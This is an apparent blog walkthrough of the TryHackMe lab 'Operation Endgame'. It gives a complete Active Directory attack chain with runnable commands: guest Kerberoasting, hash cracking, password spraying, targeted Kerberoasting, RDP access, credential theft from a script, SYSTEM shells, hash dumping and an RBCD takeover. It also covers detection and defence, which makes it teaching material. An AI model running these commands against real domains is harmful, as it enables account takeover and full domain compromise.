---
layout: post
title: "HackTheBox Operation endgame Walkthrough "
date: 2026-03-06 
categories: [tryhackme, walkthrough]
tags: [ctf, http,linux, rce, tryhackme, htb, writeups, Operation endgame, labs, nmap, Operation endgame, rid, window, active direcotry, smb, ldap, impacket, nxc, Kerberoasting, john, evilrm, hashcat, impacket-smbclient, rdp, operation_endgame tryhackme, genericwrite, genericall, tragetkerberoasting, bloodHound, smbexec.py ]
author: h4ck3rfirst
excerpt: "Complete walkthrough of the HackTheBox Pentest Lab machine 'Operation endgame hackthebox'"
---

# TryHackMe — Operation Endgame
**Difficulty:** Medium   
**OS:** Windows (Active Directory) 
**Platform:** TryHackMe  
**Category:** Active Directory, DACL Abuse, Kerberoasting, RBCD  
**Domain:** `thm.local`  
**DC Hostname:** `AD` / `ad.thm.local`

---

## Synopsis

**Operation Endgame** is a Windows Active Directory room that chains together four distinct AD attack techniques into a clean, escalating privilege path. Starting from **zero credentials**, the attack exploits guest LDAP access for unauthenticated Kerberoasting, then moves through password spraying → **DACL-based targeted Kerberoasting** (GenericWrite abuse) → RDP access → credential disclosure in a PowerShell automation script → full SYSTEM via Impacket.

The room also features a powerful **unintended path**: the guest account carries a wildly overprivileged `GenericWrite` right over the Domain Controller machine account itself — enabling a full **Resource-Based Constrained Delegation (RBCD)** compromise of the entire domain from unauthenticated access.

**Credentials Chain:**

```
[No Creds]
    │
    ▼ Guest LDAP → Unauthenticated Kerberoasting
[CODY_ROY : MkO------0]
    │
    ▼ Password Spray against all domain users
[ZACHARY_HUNT : MkO------0]  ← same password reuse
    │
    ▼ BloodHound → ZACHARY_HUNT has GenericWrite over JERRI_LANCASTER
    ▼ Targeted Kerberoasting (SPN write → TGS extract → crack)
[JERRI_LANCASTER : lovinlife!]
    │
    ▼ JERRI_LANCASTER ∈ Remote Desktop Users → RDP
    ▼ C:\Scripts\syncer.ps1 → hardcoded creds
[SANFORD_DAUGHERTY : RES************3]  (Pwn3d! — local admin)
    │
    ▼ smbexec.py → nt authority\system → flag
[SYSTEM] 
```

**Unintended Path (guest → SYSTEM in 3 steps):**
```
[guest (no password)]
    │
    ▼ guest has GenericWrite on DC$ → RBCD write
    ▼ getST.py → impersonate Administrator via S4U2Proxy
[Administrator TGS]  →  smbexec.py  →  SYSTEM 
```

---

## Skills Covered

- Unauthenticated Kerberoasting via guest LDAP
- Password spraying with cracked credentials
- BloodHound DACL analysis (GenericWrite)
- Targeted Kerberoasting (`targetedKerberoast.py`)
- RDP session via `xfreerdp`
- Credential hunting in automation scripts
- Full domain compromise via `smbexec.py`
- RBCD (Resource-Based Constrained Delegation) abuse — unintended path

---

## Reconnaissance

### Nmap Port Scan

```bash
nmap -T4 -n -sC -sV -Pn -p- $ip
```

**Key open ports:**

| Port | Service | AD Significance |
|------|---------|----------------|
| 53 | DNS | Domain name resolution |
| 80 / 443 | HTTP/S (IIS 10.0) | Web interface — check for AD CS |
| 88 | Kerberos | **Confirms Domain Controller** |
| 135/593 | MSRPC / RPC over HTTP | RPC endpoint mapper |
| 139 / 445 | NetBIOS / SMB | File sharing and lateral movement |
| 389 / 636 | LDAP / LDAPS | Directory queries |
| 3268 / 3269 | Global Catalog | Forest-wide LDAP queries |
| 3389 | RDP | Remote Desktop — will need this later |
| 9389 | .NET Message Framing | AD Web Services (ADWS) |

> **DC Fingerprint:** Ports 53 + 88 + 389 + 445 together are the unmistakable signature of an Active Directory Domain Controller. The nmap output directly reveals:
> - **Hostname:** `AD` (from `commonName=ad.thm.local` in the RDP cert)
> - **Domain:** `thm.local` (from LDAP service info)
> - **OS:** Windows Server 2019 Build 17763
> - **SMB Signing:** Enabled and Required → SMB relay attacks will not work

> **Port 443 / IIS + `thm-LABYRINTH-CA` cert CN:** The SSL certificate common name `thm-LABYRINTH-CA` reveals this server is also running **Active Directory Certificate Services (AD CS)** as a Certificate Authority. This opens the door to ESC-family attacks if any certificate templates are misconfigured — worth noting for deeper enumeration.

**Add to `/etc/hosts`:**
```bash
echo "$ip ad.thm.local thm.local" | sudo tee -a /etc/hosts
```

---

## Enumeration

### Step 1 — Guest Account Check (SMB + LDAP)

The first check on any AD engagement: can the guest account authenticate? This costs zero effort and is frequently left enabled by mistake.

```bash
# SMB guest check
nxc smb ad.thm.local -u guest -p '' --shares

# LDAP guest check
nxc ldap ad.thm.local -u guest -p ''
```

**SMB Result:**
```
[+] thm.local\guest:
Share           Permissions     Remark
IPC$            READ            Remote IPC
```

**LDAP Result:**
```
[+] thm.local\guest:   ← LDAP auth also succeeds
```

> **Why LDAP guest access matters more than SMB here:** SMB only gives us IPC$ — useful for RID bruteforce, but no file shares. LDAP with guest access lets us query the entire directory: users, groups, SPNs, password policies, DACL attributes. It's the difference between peeking through a keyhole and walking through the front door of the directory.

**RID Bruteforce (your method — username collection):**
```bash
# Enumerate all domain principals via SAMR over IPC$
nxc smb $ip -u guest -p '' --rid-brute 3000 \
  | grep SidTypeUser \
  | cut -d'\' -f2 \
  | cut -d' ' -f1 > username-rid.txt

# Quick password spray — username = password (check for weak accounts)
nxc smb $ip -u username-rid.txt -p username-rid.txt \
  --no-bruteforce --continue-on-success | grep '\[+\]'
# → No results — no username=password accounts this time
```

> **Your note:** Bruteforce with username-as-password failed here, unlike Soupedecode01. This reinforces the importance of having multiple techniques — when one approach fails, pivot immediately rather than exhausting it.

---

## Initial Access — CODY_ROY via Unauthenticated Kerberoasting

### Vulnerability: Guest LDAP + Kerberoastable SPN

Since the guest account can authenticate to LDAP, we can query for **Service Principal Names (SPNs)** — the attribute that marks an account as Kerberoastable. NetExec handles the full TGS request automatically:

```bash
nxc ldap ad.thm.local -u 'guest' -p '' --kerberoasting kerberoastables.txt
```

**Output:**
```
[*] Total of records returned 1
[*] sAMAccountName: CODY_ROY
    memberOf: CN=Remote Desktop Users,CN=Builtin,DC=thm,DC=local
    pwdLastSet: 2024-05-10 19:36:07
    lastLogon: 2024-04-24 21:11:18
[*] $krb5tgs$23$*CODY_ROY$THM.LOCAL$thm.local\CODY_ROY*$0e922c4b...
```

> **What just happened:** Without any credentials, we requested a Kerberos TGS (Ticket Granting Service) ticket for `CODY_ROY`. The KDC (Key Distribution Center) encrypted this ticket with `CODY_ROY`'s NT password hash. We now have an offline-crackable blob. The KDC cannot distinguish a legitimate service request from an attacker's — this is by design in the Kerberos protocol.

> **`etype 23` (RC4-HMAC):** The `$krb5tgs$23$` prefix indicates the ticket uses RC4-HMAC encryption. This is the weakest Kerberos encryption type and cracks significantly faster than AES128 (`etype 17`) or AES256 (`etype 18`). RC4 is deprecated but still used by many domains for backwards compatibility.

> **CODY_ROY ∈ Remote Desktop Users:** This group membership is immediately flagged — if we crack the password, we already have an RDP vector.

### Crack the TGS Hash

```bash
# John (your method — recommended without GPU)
john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat equivalent (mode 13100 = krb5tgs etype 23)
hashcat -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt

# Show cracked result
john kerberoastables.txt --show
```

**Cracked:** `CODY_ROY : MkO------0`

> **Why rockyou.txt cracked this so fast (< 2 seconds):** The password `MkO------0` is a weak password that follows a common keyboard-walk / mixed-case pattern. Rockyou.txt's 14 million entries cover most patterns that humans construct "thinking" they're complex. Truly strong service account passwords (random, 25+ chars) are essentially immune to offline cracking.

### Validate Credentials

```bash
# Test on SMB
nxc smb ad.thm.local -u 'CODY_ROY' -p 'MkO------0' --shares

# Test on LDAP
nxc ldap ad.thm.local -u 'CODY_ROY' -p 'MkO------0'
```

**New share access:** `NETLOGON (READ)`, `SYSVOL (READ)` — standard for any authenticated domain user.

---

## Lateral Movement — ZACHARY_HUNT via Password Spraying

### Step 1 — Full User Enumeration via LDAP

With valid domain credentials, we can query LDAP for every domain user — a much cleaner list than RID bruteforce:

```bash
# Dump all domain users with nxc
nxc ldap ad.thm.local -u 'CODY_ROY' -p 'MkO------0' --users \
  | grep LDAP \
  | awk '{print $5}' > users.txt

# Alternatively with RID brute (still valid)
nxc smb $ip -u 'CODY_ROY' -p 'MkO------0' --rid-brute 3000 \
  | grep SidTypeUser \
  | cut -d'\' -f2 \
  | cut -d' ' -f1 > users.txt
```

**Sample users.txt:**
```
Administrator
Guest
krbtgt
SHANA_FITZGERALD
CAREY_FIELDS
DWAYNE_NGUYEN
BRANDON_PITTMAN
... (many more)
CODY_ROY
ZACHARY_HUNT
JERRI_LANCASTER
SANFORD_DAUGHERTY
```

### Step 2 — Password Spray

Since `CODY_ROY`'s password was weak, check if it's been reused across the organization:

```bash
nxc smb ad.thm.local \
  -u users.txt \
  -p 'MkO------0' \
  --continue-on-success \
  | grep '\[+\]'
```

**Output:**
```
[+] thm.local\CODY_ROY:MkO------0
[+] thm.local\ZACHARY_HUNT:MkO------0
```

> **Password reuse is endemic in enterprise environments.** In real-world engagements, a single cracked password sprayed against hundreds of accounts routinely hits 5–20% of users. Shared passwords often originate from: IT staff setting default passwords during provisioning, password-sync policies, or users on the same team sharing a "team password."

> ** Lockout awareness:** Always check the domain lockout policy before spraying. One password per run is safe against most default policies (typically 5–10 failed attempts before lockout).
> ```bash
> nxc smb $ip -u 'CODY_ROY' -p 'MkO------0' --pass-pol
> ```

### Step 3 — BloodHound Collection

With `CODY_ROY` or `ZACHARY_HUNT` credentials, collect full AD graph data:

```bash
# Method 1: bloodhound-ce-python (recommended)
bloodhound-ce-python \
  -u 'cody_roy@thm.local' \
  -p 'MkO------0' \
  --zip \
  -dc ad.thm.local \
  -c All \
  -d thm.local \
  -ns $ip \
  --dns-timeout 10 \
  --dns-tcp

# Method 2: nxc BloodHound collection
nxc ldap ad.thm.local -u 'CODY_ROY' -p 'MkO------0' \
  --bloodhound --collection All \
  --dns-server $ip

# Method 3: SharpHound (from RDP session later)
.\SharpHound.exe -c All --zipfilename bh_data.zip
```

**BloodHound findings:**
- `CODY_ROY` — no special privileges, just a standard domain user
- **`ZACHARY_HUNT` has `GenericWrite` over `JERRI_LANCASTER`** ← critical
- `JERRI_LANCASTER` is a member of **Remote Desktop Users** group
- `guest` has **`GenericWrite` over `AD$` (the DC machine account)** ← unintended path

---

## DACL Abuse — JERRI_LANCASTER via Targeted Kerberoasting

### Vulnerability: GenericWrite → Targeted Kerberoasting

`ZACHARY_HUNT` holds `GenericWrite` over `JERRI_LANCASTER`. This DACL right means ZACHARY_HUNT can write to most attributes on JERRI_LANCASTER's AD object — including the `servicePrincipalName` attribute.

**The attack flow:**
1. Write a temporary, fake SPN onto `JERRI_LANCASTER`'s account
2. Request a TGS for that SPN (standard Kerberoasting)
3. Crack the TGS hash offline to recover `JERRI_LANCASTER`'s password
4. Remove the temporary SPN (cleanup — `targetedKerberoast.py` does this automatically)

> **Why is this significant?** Standard Kerberoasting only works on accounts that already have an SPN. Targeted Kerberoasting weaponizes `GenericWrite` to *create* a Kerberoastable account on demand. Any user with `GenericWrite`, `WriteProperty` (on SPN), or `GenericAll` over another account can execute this attack.

```bash
# targetedKerberoast.py handles SPN-add → TGS-request → SPN-remove automatically
targetedKerberoast.py \
  -v \
  -d 'thm.local' \
  -u 'ZACHARY_HUNT' \
  -p 'MkO------0' \
  --dc-host ad.thm.local \
  --request-user JERRI_LANCASTER
```

**Verbose output:**
```
[*] Starting kerberoast attacks
[*] Attacking user (JERRI_LANCASTER)
[VERBOSE] SPN added successfully for (JERRI_LANCASTER)
[+] Printing hash for (JERRI_LANCASTER)
$krb5tgs$23$*JERRI_LANCASTER$THM.LOCAL$thm.local/JERRI_LANCASTER*$b042e1d7...
[VERBOSE] SPN removed successfully for (JERRI_LANCASTER)
```

> **The cleanup step matters:** `[VERBOSE] SPN removed successfully` — the tool writes the SPN, captures the hash, then removes the SPN. This leaves a minimal footprint. However, AD audit logs will still record the `servicePrincipalName` write event — a SOC analyst with proper SACL auditing would catch this.

**Alternative manual method (if targetedKerberoast.py is unavailable):**
```bash
# Step 1: Write fake SPN using ZACHARY_HUNT's GenericWrite
python3 bloodyAD.py -d thm.local -u ZACHARY_HUNT -p 'MkO------0' \
  --host ad.thm.local \
  set object JERRI_LANCASTER servicePrincipalName -v 'fake/spn'

# Step 2: Request the TGS
GetUserSPNs.py -request -outputfile jerri.hash \
  'thm.local/ZACHARY_HUNT:MkO------0' \
  -usersid $(getPac.py 'thm.local/JERRI_LANCASTER' | grep SID)

# Step 3: Clean up SPN
python3 bloodyAD.py -d thm.local -u ZACHARY_HUNT -p 'MkO------0' \
  --host ad.thm.local \
  remove object JERRI_LANCASTER servicePrincipalName -v 'fake/spn'
```

### Crack JERRI_LANCASTER's Hash

```bash
john hash-jerro_lancaster --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked:** `JERRI_LANCASTER : lovinlife!`

---

## RDP Access — JERRI_LANCASTER

BloodHound shows `JERRI_LANCASTER ∈ Remote Desktop Users`. We now have credentials — time to get an interactive desktop session:

```bash
# xfreerdp (standard)
xfreerdp /v:ad.thm.local \
  /u:'jerri_lancaster' \
  /p:'lovinlife!' \
  /dynamic-resolution \
  /clipboard \
  /cert:ignore

# xfreerdp3 (newer syntax)
xfreerdp3 /v:ad.thm.local \
  /u:'jerri_lancaster' \
  /p:'lovinlife!' \
  /dynamic-resolution \
  /clipboard \
  /cert:ignore

# Alternative: rdesktop
rdesktop -u jerri_lancaster -p 'lovinlife!' ad.thm.local

# Alternative: Remmina (GUI)
# Set protocol to RDP, enter IP and credentials
```

> **Profile creation error on login:** The first login for `JERRI_LANCASTER` may show a profile setup error. This is harmless — it just means the user's roaming profile couldn't be loaded. Dismiss the dialog and use `WIN + R` → type `cmd` → press Enter to get a command prompt.

---

## Credential Discovery — SANFORD_DAUGHERTY

### Enumerate C:\ for Interesting Directories

Once inside the RDP session, standard filesystem enumeration reveals a non-default directory:

```cmd
:: From cmd.exe
dir C:\
dir C:\Scripts\
type C:\Scripts\syncer.ps1
```

**Contents of `syncer.ps1`:**

```powershell
# Automation script — DO NOT SHARE
$username = "sanford_daugherty"
$password = "RES************3"
$secpass = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-PSCredential -Credential $username -Password $secpass
# ... sync job logic
```

> **Why are credentials in scripts so common?** Automation requires authentication. Developers and sysadmins frequently hardcode credentials into scripts because "it's just an internal script" or "it's on a secure server." This is one of the most common credential discovery vectors in real-world red team engagements. Key places to always check:
> - `C:\Scripts\`, `C:\Automation\`, `C:\Tools\`, `C:\Admin\`
> - `C:\inetpub\` (web app configs with DB credentials)
> - `C:\ProgramData\`, `C:\Program Files\` (service configs)
> - Scheduled task XML files (`schtasks /query /fo LIST /v`)
> - Group Policy files (`\\DC\SYSVOL\...` → `Groups.xml` for `cpassword`)
> - WinSCP, PuTTY, MobaXterm config files (saved sessions)

**PowerShell search for credential keywords:**
```powershell
# Find scripts containing password strings
Get-ChildItem C:\ -Recurse -Include *.ps1,*.bat,*.cmd,*.xml,*.txt,*.ini,*.config `
  -ErrorAction SilentlyContinue | `
  Select-String -Pattern "password|passwd|pwd|credential|secret|key" | `
  Select-Object Path, LineNumber, Line | `
  Format-Table -AutoSize
```

### Validate SANFORD_DAUGHERTY

```bash
nxc smb ad.thm.local -u 'sanford_daugherty' -p 'RES************3'
```

```
[+] thm.local\SANFORD_DAUGHERTY:RES************3 (Pwn3d!)
```

> **`(Pwn3d!)` — what it means:** NetExec marks an account as `Pwn3d!` when it can access `ADMIN$` or `C$` on the target, confirming **local administrator** access. On a Domain Controller, local admin = `NT AUTHORITY\SYSTEM` in practice — full domain compromise.

---

## Domain Compromise — SYSTEM via smbexec

### Method 1 — smbexec.py (Your Path — Semi-Interactive Shell)

```bash
smbexec.py 'THM.LOCAL/SANFORD_DAUGHERTY:RES************3@ad.thm.local'
```

```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt.txt
THM{INFILTRATION---------------------------NETWORK_ASSERTS}  
```

### Method 2 — psexec.py (Interactive SYSTEM Shell)

```bash
psexec.py 'THM.LOCAL/SANFORD_DAUGHERTY:RES************3@ad.thm.local'
# Drops a service binary — noisier but fully interactive
```

### Method 3 — wmiexec.py (Stealthier — No Service Creation)

```bash
wmiexec.py 'THM.LOCAL/SANFORD_DAUGHERTY:RES************3@ad.thm.local'
# Uses DCOM/WMI — doesn't touch Service Control Manager
```

### Method 4 — Dump Domain Hashes (Secretsdump)

With admin access to the DC, harvest all domain credentials:

```bash
secretsdump.py 'THM.LOCAL/SANFORD_DAUGHERTY:RES************3@ad.thm.local'
# Dumps: NTDS.dit hashes, LSA secrets, cached credentials
# Output includes: Administrator:500:...:NTLM_HASH:::
```

---

## Unintended Path — RBCD Full Domain Compromise from Guest

### The Misconfiguration

BloodHound reveals that the **guest account** has `GenericWrite` over `AD$` — the Domain Controller's **machine account**. This is an extreme misconfiguration: `GenericWrite` on a machine account allows writing the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, which controls **Resource-Based Constrained Delegation**.

### RBCD Attack Flow

**RBCD concept:** If you can write to a target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, you can configure which accounts the DC will trust to impersonate arbitrary users via the Kerberos S4U2Proxy extension. Combined with an account that has an SPN (like `CODY_ROY`, which we already know), we can impersonate any domain user — including `Administrator` — against the DC.

```
guest (GenericWrite on AD$)
    │
    ├── Set AD$.msDS-AllowedToActOnBehalfOfOtherIdentity = CODY_ROY
    │
CODY_ROY (SPN set, password known: MkO------0)
    │
    ├── S4U2Self: Get TGS for CODY_ROY impersonating Administrator
    ├── S4U2Proxy: Exchange for TGS to cifs/ad.thm.local as Administrator
    │
    ▼ Use ticket → smbexec as SYSTEM
```

### Step 1 — Write RBCD Attribute (as guest, no password)

```bash
rbcd.py THM.LOCAL/guest \
  -no-pass \
  -dc-ip $ip \
  -delegate-to 'AD$' \
  -delegate-from 'CODY_ROY' \
  -action write
```

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] CODY_ROY can now impersonate users on AD$ via S4U2Proxy
```

### Step 2 — Request TGS Impersonating Administrator

```bash
getST.py \
  -impersonate "Administrator" \
  -spn "cifs/ad.thm.local" \
  -k -no-pass \
  'THM.LOCAL/CODY_ROY:MkO------0'
```

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_ad.thm.local@THM.LOCAL.ccache
```

### Step 3 — Use Ticket → SYSTEM Shell

```bash
export KRB5CCNAME=Administrator@cifs_ad.thm.local@THM.LOCAL.ccache

smbexec.py -k -no-pass Administrator@ad.thm.local
```

```
C:\Windows\system32> whoami
nt authority\system
```

> **This is 3 commands from guest to SYSTEM.** The guest account effectively had the ability to compromise the entire domain unilaterally. In a real environment this would be a Critical severity finding — `GenericWrite` on the DC machine account should never be assigned to any unprivileged principal.

---

## Attack Chain Summary

### Intended Path
```
[Guest Account]
      │
      │  nxc ldap --kerberoasting → CODY_ROY TGS
      │  john → MkO------0
      ▼
[CODY_ROY : MkO------0]
      │
      │  nxc ldap --users → full user list
      │  nxc smb password spray → ZACHARY_HUNT same password
      ▼
[ZACHARY_HUNT : MkO------0]
      │
      │  bloodhound → GenericWrite over JERRI_LANCASTER
      │  targetedKerberoast.py → JERRI TGS
      │  john → lovinlife!
      ▼
[JERRI_LANCASTER : lovinlife!]
      │
      │  bloodhound → Remote Desktop Users member
      │  xfreerdp → RDP session
      │  C:\Scripts\syncer.ps1 → SANFORD_DAUGHERTY:RES************3
      ▼
[SANFORD_DAUGHERTY : RES************3]  (Pwn3d!)
      │
      │  smbexec.py → nt authority\system
      ▼
[SYSTEM] → flag.txt.txt 

### Unintended Path
[Guest Account]
      │
      │  bloodhound → guest GenericWrite on AD$
      │  rbcd.py → write msDS-AllowedToActOnBehalfOfOtherIdentity
      │  getST.py → impersonate Administrator via S4U2Proxy
      ▼
[Administrator TGS]
      │
      │  smbexec.py -k -no-pass
      ▼
[SYSTEM]  (3 commands, no password cracking)
```

---

## Concept Deep-Dives

### Unauthenticated Kerberoasting via Guest LDAP

Standard Kerberoasting requires at least one valid domain credential to query LDAP for SPNs. However, if the guest account is enabled and can bind to LDAP, this requirement is bypassed entirely. The root cause is that LDAP guest authentication inherits whatever permissions the guest account has been granted — and in this domain, the guest could read SPN attributes.

The Kerberos TGS request itself is a legitimate protocol operation: any authenticated principal (even guest) can request a service ticket for any SPN. The KDC has no way to distinguish malicious from legitimate requests because there are none — both use identical protocol messages.

**Detection:** Monitor for TGS requests for user accounts (not computer accounts) originating from the guest SID, or for abnormally high volumes of TGS requests from a single account in a short timeframe. Windows Event ID **4769** logs TGS requests.

**Defense:** Disable the guest account entirely. For service accounts, use **Group Managed Service Accounts (gMSA)** — these have 120-character auto-rotating passwords that make cracking computationally infeasible.

---

### GenericWrite → Targeted Kerberoasting

`GenericWrite` is a broad Active Directory DACL right that grants write access to most non-protected attributes on an AD object. The `servicePrincipalName` attribute is not protected by default, so `GenericWrite` holders can add or modify SPNs.

The attack weaponizes this by writing a temporary, attacker-controlled SPN. This transforms a non-Kerberoastable account into a Kerberoastable one for the duration of the attack. The SPN doesn't need to resolve to anything real — the KDC will issue a TGS for any syntactically valid SPN.

**Other attacks enabled by GenericWrite:**
- **Shadow Credentials:** Write `msDS-KeyCredentialLink` → authenticate as target without knowing the password (requires AD CS / PKINIT)
- **ASREPRoast forcing:** Disable Kerberos pre-auth (`userAccountControl` write) → harvest ASREP hash
- **Logon script abuse:** Set `scriptPath` → execute arbitrary code next time the target logs on

**Detection:** Windows Event ID **5136** (A directory service object was modified) with `AttributeLDAPDisplayName: servicePrincipalName`. A SPN written and then removed within seconds is a strong indicator of targeted Kerberoasting.

---

### RBCD (Resource-Based Constrained Delegation)

Traditional Kerberos delegation (unconstrained or constrained) is configured on the *delegating* account — an admin has to explicitly grant "this account can impersonate users to these services." RBCD inverts this: the trust is configured on the *target* resource — "these accounts are allowed to impersonate users to me."

The attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object holds a binary security descriptor listing which accounts can perform delegation to it. If an attacker can write this attribute (via `GenericWrite`, `WriteDACL`, or `WriteOwner` on the computer object), they can add any controlled account and then abuse S4U2Proxy to impersonate any domain user — including `Administrator` — against that target computer.

**S4U2Self / S4U2Proxy flow:**
1. **S4U2Self:** The controlled account (CODY_ROY) requests a TGS to itself *on behalf of* the target user (Administrator). No interaction with Administrator needed.
2. **S4U2Proxy:** Exchanges the S4U2Self ticket for a TGS to the target service (cifs/ad.thm.local) as the impersonated user.

Since `Protected Users` group members and accounts with `Account is sensitive and cannot be delegated` flag are immune to delegation, `Administrator` would not be impersonatable if those protections were applied.

**Defense:** Never assign `GenericWrite` or `WriteDACL` on computer accounts — especially the DC — to non-admin principals. Audit `msDS-AllowedToActOnBehalfOfOtherIdentity` on all computer objects regularly.

---

### Hardcoded Credentials in Automation Scripts

`C:\Scripts\syncer.ps1` containing plaintext credentials is a **CWE-312** (Cleartext Storage of Sensitive Information) finding. Automation scripts are a prime source of credential disclosure in real-world engagements because:

1. Service accounts need to authenticate — developers take the path of least resistance
2. Scripts often live in non-standard directories that don't receive the same access controls as system folders
3. "It's not production code" mentality leads to lower security scrutiny

**Secure alternatives:**
- **Windows Credential Manager / DPAPI:** `cmdkey /add` stores credentials encrypted with the user's master key
- **Secret management platforms:** HashiCorp Vault, CyberArk, Azure Key Vault — service accounts authenticate to the vault, never see credentials in plaintext
- **gMSA (Group Managed Service Accounts):** Eliminates passwords for service accounts entirely — the DC manages password rotation automatically
- **PowerShell SecretManagement module:** `Get-Secret` / `Set-Secret` with encrypted vaults

---

## Key Takeaways

**1. Guest LDAP Access Is a Domain-Level Risk**  
Guest authentication to LDAP enables unauthenticated Kerberoasting, user enumeration, and password policy disclosure. There is no legitimate use case for guest LDAP access on a Domain Controller. Disable the guest account at the domain level and verify with `nxc ldap $ip -u guest -p ''`.

**2. Shared Passwords Across Accounts Multiply Blast Radius**  
`CODY_ROY` and `ZACHARY_HUNT` sharing `MkO------0` turned one cracked hash into two compromised accounts. A strong password rotation policy and credential hygiene audit would catch this. Use LAPS (Local Administrator Password Solution) for service accounts where gMSA isn't applicable.

**3. BloodHound Is Non-Negotiable for AD Engagements**  
The `GenericWrite → targeted Kerberoasting` pivot was invisible without BloodHound. Manual DACL enumeration of hundreds of users is impractical. BloodHound's graph analysis surfaces attack paths that would otherwise require days of manual work.

**4. GenericWrite Is Not a "Low-Risk" DACL Right**  
Security teams often focus on `GenericAll` and `WriteDACL` as dangerous rights while overlooking `GenericWrite`. This room demonstrates that `GenericWrite` on a user account leads to full account compromise, and `GenericWrite` on a computer account (especially the DC) enables full domain takeover via RBCD.

**5. Plaintext Credentials in Scripts Are a Critical Finding**  
`RES************3` in a PowerShell script was the bridge from a limited RDP session to full domain compromise. All scripts containing credentials should be found, replaced with secrets management solutions, and treated as immediate security incidents.

**6. Guest → Domain Admin in 3 Commands Is a P0 Finding**  
The unintended RBCD path (guest `GenericWrite` on DC$) represents a complete domain compromise accessible to any unauthenticated network-adjacent attacker. In a real engagement, this would be the first finding in the executive summary.

---

## Tools Reference

| Tool | Purpose | Key Flags |
|------|---------|-----------|
| `nmap -sCV -p-` | Full port scan with service detection | `-Pn` for no ping, `-T4` for speed |
| `nxc smb` | SMB enumeration, spraying, exec | `--shares`, `--rid-brute`, `--pass-pol` |
| `nxc ldap` | LDAP queries, Kerberoasting | `--kerberoasting`, `--users`, `--bloodhound` |
| `bloodhound-ce-python` | AD graph collection | `-c All --zip` |
| `john` | Hash cracking (CPU) | `--wordlist=rockyou.txt` |
| `hashcat -m 13100` | TGS hash cracking (GPU) | Faster than john with GPU |
| `targetedKerberoast.py` | GenericWrite → SPN write → TGS | `--request-user TARGET` |
| `xfreerdp` / `xfreerdp3` | RDP client | `/dynamic-resolution /clipboard /cert:ignore` |
| `smbexec.py` | Semi-interactive SYSTEM shell via SMB | `DOMAIN/user:pass@host` |
| `psexec.py` | Full interactive SYSTEM shell | Drops binary — noisier |
| `wmiexec.py` | Stealthier exec via DCOM/WMI | No service creation |
| `secretsdump.py` | Dump NTDS.dit / LSA secrets | Best for full domain harvest |
| `rbcd.py` | Write RBCD delegation attribute | `-action write -delegate-to -delegate-from` |
| `getST.py` | S4U2Proxy ticket request | `-impersonate Administrator -spn cifs/host` |

---

